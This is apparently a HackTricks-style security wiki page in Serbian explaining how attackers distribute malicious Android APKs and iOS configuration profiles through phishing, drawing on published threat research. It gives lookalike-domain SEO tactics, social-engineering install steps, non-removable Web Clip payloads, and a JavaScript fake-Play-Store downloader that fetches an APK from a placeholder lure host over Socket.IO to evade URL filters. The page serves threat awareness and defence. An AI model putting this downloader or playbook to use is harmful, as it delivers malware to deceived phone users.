# Mobile Phishing i distribucija zlonamernih aplikacija (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obrađuje tehnike koje akteri pretnji koriste za distribuciju **zlonamernih Android APK-ova** i **iOS profila za mobilnu konfiguraciju** putem phishinga (SEO, socijalni inženjering, lažne prodavnice, aplikacije za upoznavanje itd.).
> Materijal je prilagođen kampanji SarangTrap koju je otkrio Zimperium zLabs (2025) i drugim javnim istraživanjima.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/phishing infrastruktura**
   * Registrujte desetine domena koji liče na poznate (upoznavanje, deljenje datoteka u oblaku, auto-servis…).
     – Koristite ključne reči na lokalnom jeziku i emotikone u elementu `<title>` da biste se bolje rangirali na Google-u.
     – Na istoj odredišnoj stranici smestite uputstva za instalaciju i za Android (`.apk`) i za iOS.
2. **Preuzimanje prve faze**
   * Android: direktna veza do *nepotpisanog* APK-a ili APK-a iz „prodavnice treće strane“.
   * iOS: veza `itms-services://` ili obična HTTPS veza do zlonamernog profila **mobileconfig** (pogledajte ispod).
3. **Ponašanje Android malware-a nakon instalacije**
   * Izvršavanje uslovljeno C2-om, zloupotreba dozvola, zaobilaženje dropper-a, prikupljanje podataka u pozadini i druga ponašanja malware-a nakon instalacije obrađena su na posebnoj stranici o Android Malware Post-Exploitation navedenoj ispod.
4. **Tehnika isporuke za iOS**
   * Jedan **profil za mobilnu konfiguraciju** može da zatraži `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi uređaj uključio u nadzor nalik na „MDM“.
   * Uputstva zasnovana na socijalnom inženjeringu:
     1. Otvorite Settings ➜ *Profil je preuzet*.
     2. Dodirnite *Install* tri puta (snimci ekrana su na phishing stranici).
     3. Pouzdajte se nepotpisanom profilu ➜ napadač dobija ovlašćenja za *Contacts* i *Photo* bez provere u App Store-u.
5. **iOS Web Clip payload (ikona phishing aplikacije)**
   * Payload-i `com.apple.webClip.managed` mogu da **zakače phishing URL na početni ekran** uz brendiranu ikonu/naziv.
   * Web Clips mogu da rade **preko celog ekrana** (skrivajući interfejs pregledača) i mogu biti označeni kao **neuklonjivi**, zbog čega žrtva mora da izbriše profil da bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Mrežni sloj**
   * Običan HTTP, često na portu 80, sa HOST zaglavljem kao što je `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako se uočava).

## Android Malware Post-Exploitation

Za tehnike Android malware-a nakon instalacije, kao što su C2, zloupotreba Accessibility-ja, overlays, ATS automatizacija, učitavanje DEX-a u fazama, premium SMS i persistence, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK smuggling zasnovan na Socket.IO/WebSocket-u + lažne Google Play stranice

Napadači sve češće zamenjuju statične APK veze Socket.IO/WebSocket kanalom ugrađenim u mamce koji liče na Google Play. Time se prikriva URL payloada, zaobilaze filteri za URL-ove/ekstenzije i zadržava uverljivo korisničko iskustvo instalacije.<sup>[[2]](#references)[[4]](#references)</sup>

Tipičan tok klijenta zabeležen u praksi:

<details>
<summary>Socket.IO lažni Play downloader (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Zašto izmiče jednostavnim kontrolama:
- Ne izlaže se statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frejmova.
- Filteri za URL/MIME/ekstenzije koji blokiraju direktne .apk odgovore možda neće prepoznati binarne podatke tunelovane preko WebSockets/Socket.IO.
- Crawler-i i URL sandbox-i koji ne izvršavaju WebSockets neće preuzeti payload.

Pogledajte i WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Mračna strana romantike: SarangTrap kampanja iznude](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payloada za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankarski trojanac cilja korisnike Androida u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
